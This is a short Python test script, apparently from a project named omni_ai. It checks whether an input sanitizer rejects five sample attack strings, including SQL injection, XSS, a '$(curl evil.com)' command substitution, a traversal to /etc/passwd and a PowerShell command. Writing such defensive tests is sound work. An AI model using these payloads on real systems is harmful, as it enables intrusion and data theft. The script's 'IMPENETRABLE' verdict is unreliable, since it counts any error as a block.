#!/usr/bin/env python3
"""
üõ°Ô∏è SECURITY PROOF TEST
This script proves that your AI system BLOCKS attacks, not performs them.
"""

import sys
import os
sys.path.append('src')

from omni_ai.security.input_validation import InputSanitizer, SecurityError

def test_attack_blocking():
    """Test that our system BLOCKS attacks"""
    
    print("üîí TESTING SECURITY FORTRESS")
    print("=" * 50)
    
    malicious_inputs = [
        "'; DROP TABLE users; --",  # SQL Injection
        "<script>alert('xss')</script>",  # XSS
        "$(curl evil.com)",  # Command Injection
        "../../../etc/passwd",  # Directory Traversal
        "powershell.exe -Command 'Get-Process'"  # PowerShell Injection
    ]
    
    blocked_count = 0
    
    for attack in malicious_inputs:
        print(f"\nüß™ Testing: {attack[:50]}...")
        
        try:
            # Try to process the malicious input
            result = InputSanitizer.sanitize_text(attack)
            print(f"‚ùå SECURITY BREACH! Attack succeeded: {result}")
        except SecurityError as e:
            print(f"‚úÖ BLOCKED! SecurityError: {str(e)}")
            blocked_count += 1
        except Exception as e:
            print(f"‚úÖ BLOCKED! Error: {str(e)}")
            blocked_count += 1
    
    print("\n" + "=" * 50)
    print(f"üõ°Ô∏è SECURITY RESULTS:")
    print(f"   Attacks tested: {len(malicious_inputs)}")
    print(f"   Attacks blocked: {blocked_count}")
    print(f"   Success rate: {(blocked_count/len(malicious_inputs)*100):.1f}%")
    
    if blocked_count == len(malicious_inputs):
        print("\nüè∞ FORTRESS STATUS: IMPENETRABLE!")
        print("‚úÖ Your AI system successfully blocks ALL attacks!")
    else:
        print("\n‚ö†Ô∏è WARNING: Some attacks were not blocked!")
        print("‚ùå Your system needs security improvements!")

if __name__ == "__main__":
    test_attack_blocking()